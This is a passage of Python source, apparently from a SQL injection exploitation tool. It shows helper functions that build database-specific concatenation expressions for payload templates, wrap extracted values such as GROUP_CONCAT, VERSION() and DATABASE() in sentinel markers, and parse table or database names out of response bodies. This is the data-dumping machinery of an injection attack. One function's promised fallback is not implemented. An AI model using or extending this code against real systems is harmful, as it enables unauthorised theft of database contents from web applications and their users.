        One of ``"mysql"``, ``"postgresql"``, ``"mssql"``, ``"sqlite"``.

    Returns
    -------
    str
        SQL expression suitable for substituting into the ``{COLUMNS}``
        placeholder of a payload template.
    """
    if db_type == "postgresql":
        parts = [f"COALESCE({c}::TEXT,'NULL')" for c in columns]
        return "||'|'||".join(parts)
    if db_type == "mssql":
        parts = [f"COALESCE(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns]
        return "+'|'+".join(parts)
    if db_type == "sqlite":
        parts = [f"COALESCE(CAST({c} AS TEXT),'NULL')" for c in columns]
        return "||'|'||".join(parts)
    # mysql (default): use backtick-quoted identifiers and hex literal separator
    parts = [f"COALESCE(CAST(`{c}` AS CHAR),'NULL')" for c in columns]
    return ",0x7c,".join(parts)


def _split_csv(raw: str) -> List[str]:
    """Split a comma-separated string, stripping whitespace.

    Returns an empty list for empty/None input.
    """
    if not raw:
        return []
    return [v.strip() for v in raw.split(",") if v.strip()]


def _escape_table_name(name: str) -> str:
    """Return *name* with backtick-unsafe characters removed.

    Only alphanumerics and underscores are retained so the name can be safely
    embedded in a backtick-quoted SQL identifier.
    """
    return re.sub(r"[^\w]", "", name, flags=re.ASCII)


def _wrap_first_column(payload: str, sentinel: str) -> str:
    """Wrap the first non-NULL column expression in *payload* with *sentinel*.

    Looks for common patterns emitted by the payload templates
    (``GROUP_CONCAT``, ``string_agg``, ``STRING_AGG``, ``DATABASE()``,
    ``VERSION()``, ``sqlite_version()``, ``current_database()`` …) and
    wraps the outermost expression with ``CONCAT(sentinel, expr, sentinel)``.

    Falls back to prepending a CONCAT wrapper around the first SELECT item.
    """
    # Patterns to detect the "active" column expression in the payload
    _EXPR_PATTERNS = [
        r"(GROUP_CONCAT\([^)]+(?:\([^)]*\)[^)]*)*\))",
        r"(string_agg\([^)]+\))",
        r"(STRING_AGG\([^,]+,[^)]+\))",
        r"(VERSION\(\))",
        r"(@@VERSION)",
        r"(DATABASE\(\))",
        r"(DB_NAME\(\))",
        r"(current_database\(\))",
        r"(sqlite_version\(\))",
        r"('main')",
    ]
    for pat in _EXPR_PATTERNS:
        m = re.search(pat, payload, re.IGNORECASE)
        if m:
            expr = m.group(1)
            wrapped = f"CONCAT('{sentinel}',{expr},'{sentinel}')"
            return payload[: m.start(1)] + wrapped + payload[m.end(1) :]
    # Generic fallback: insert sentinel around first SELECT column
    return payload


def _extract_csv_fallback(body: str) -> Optional[str]:
    """Attempt to extract a comma-separated value list from *body*.

    Returns the first match of a pattern that looks like
    ``tablename,tablename,...`` or ``dbname,dbname,...``.
    """
    m = re.search(r"\b([a-z_][a-z0-9_]*(?:,[a-z_][a-z0-9_]*){2,100})\b", body, re.IGNORECASE)
    if m:
        return m.group(1)
    return None
